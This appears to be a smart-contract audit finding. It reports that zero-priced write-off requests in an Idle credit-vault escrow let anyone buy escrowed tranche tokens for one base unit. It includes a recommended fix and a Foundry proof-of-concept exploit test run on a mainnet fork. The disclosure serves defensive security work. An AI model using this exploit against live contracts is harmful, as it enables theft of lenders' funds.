### Title
Zero-priced write-off requests allow theft of escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary

`createWriteOffRequest` validates that escrowed `amount` is nonzero, but accepts `underlyingsRequested == 0` while immediately transferring the seller's tranche tokens into escrow. [1](#0-0)  `fullfillWriteOffRequest` is callable by any wallet and only requires `_underlyings >= currentRequest.underlyings`, so a zero-priced request can be fulfilled with one underlying base unit. [2](#0-1) 

### Finding Description

A lender creates a write-off request during a running epoch by escrowing a positive amount of AA or BB tranche tokens. The contract detects a zero tranche amount, but does not detect a zero requested payment, so a request can escrow valuable tranche tokens while requesting no underlying assets. [1](#0-0) 

During fulfillment, the order is deleted and the fulfiller receives the entire escrowed `currentRequest.tranches`; the only payment validation is that the supplied underlying amount is not below the recorded request. [3](#0-2)  Consequently, a request recording `underlyings == 0` can be fulfilled with either zero underlying, where the token supports zero-value `transferFrom`, or one base unit to satisfy stricter ERC-20 allowance paths. [4](#0-3) 

The vulnerable sequence is in-scope and requires no privileged action: a KYC-passing lender creates the malformed request while the epoch is running, and an unprivileged fulfiller atomically takes the escrowed tranche tokens. [5](#0-4) [2](#0-1) 

### Impact Explanation

The seller can lose the entire escrowed tranche position for a payment of one underlying base unit. For example, at a tranche price near 1 USDC per tranche token, a request escrowing `10_000e18` tranche tokens can be purchased for `1` wei-denominated USDC, resulting in approximately 10,000 USDC of stolen value. [2](#0-1) 

This breaks the escrow's one-order/one-payment invariant: tranche tokens leave escrow before any meaningful consideration is required, and the order is deleted before asset settlement. [6](#0-5) 

### Likelihood Explanation

Exploitation requires a lender or integration to create a malformed request with `underlyingsRequested == 0`, but assets are escrowed immediately and fulfillment is intentionally permissionless. [7](#0-6) [8](#0-7)  An attacker can monitor `userRequests` or the creation transaction and fulfill the order before the owner or seller can react; no borrower cooperation, oracle manipulation, default, or privileged role is needed. [2](#0-1) 

### Recommendation

Reject zero-priced requests in `createWriteOffRequest`, for example with `if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();`. [1](#0-0)  Consider additionally enforcing a nonzero expected price or a minimum viable underlying amount based on token decimals, because an economically equivalent request for one underlying base unit would still pass a simple nonzero check. [3](#0-2) 

### Proof of Concept

Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, whose existing `setUp` forks mainnet, initializes the escrow, and approves the escrow for `LP`'s AA tranche tokens. [9](#0-8) 

```solidity
function testZeroPriceWriteOffRequestCanBeTakenForDust() external {
    uint256 tranches = 10_000e18;
    address attacker = makeAddr("zeroPriceFulfiller");

    // A lender mistakenly creates a valid nonzero-tranche request with a zero ask.
    vm.prank(LP);
    escrow.createWriteOffRequest(tranches, 0);

    (uint256 storedTranches, uint256 storedUnderlyings) = escrow.userRequests(LP);
    assertEq(storedTranches, tranches);
    assertEq(storedUnderlyings, 0);

    // An arbitrary EOA pays only one USDC base unit and receives all escrowed tranches.
    deal(address(underlying), attacker, 1);
    vm.startPrank(attacker);
    underlying.approve(address(escrow), 1);
    escrow.fullfillWriteOffRequest(LP, tranches, 1);
    vm.stopPrank();

    (storedTranches, storedUnderlyings) = escrow.userRequests(LP);
    assertEq(storedTranches, 0);
    assertEq(storedUnderlyings, 0);
    assertEq(tranche.balanceOf(attacker), tranches);
    assertEq(underlying.balanceOf(attacker), 0);
    assertEq(underlying.balanceOf(LP), 1);
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L118-151)
```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L32-63)
```text
  function setUp() public {
    vm.createSelectFork('mainnet', 23032567);

    // we deploy a new IdleCDOEpochVariant and IdleCreditVault contract used only to get the bytecode 
    // and etch at the same address of the original one so to enable console.log in the IdleCDOEpochVariant 
    // and new features not yet deployed on mainnet
    IdleCDOEpochVariant dummy = new IdleCDOEpochVariant();
    IdleCreditVault dummyStrategy = new IdleCreditVault();
    vm.etch(address(cdoEpoch), address(dummy).code);
    vm.etch(cdoEpoch.strategy(), address(dummyStrategy).code);

    escrow = new IdleCreditVaultWriteOffEscrow();
    // allow initialization of the escrow contract
    vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
    escrow.initialize(address(cdoEpoch), TL_MULTISIG, true);

    underlying = IERC20Detailed(cdoEpoch.token());
    strategy = IdleCreditVault(cdoEpoch.strategy());
    manager = strategy.manager();
    borrower = strategy.borrower();
    tranche = IERC20Detailed(cdoEpoch.AATranche());

    // approve escrow contract to spend tranches tokens of address(this)
    tranche.approve(address(escrow), type(uint256).max);

    // allow everyone to deposit
    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(address(0), 1);

    vm.prank(LP);
    tranche.approve(address(escrow), type(uint256).max);
  }
```
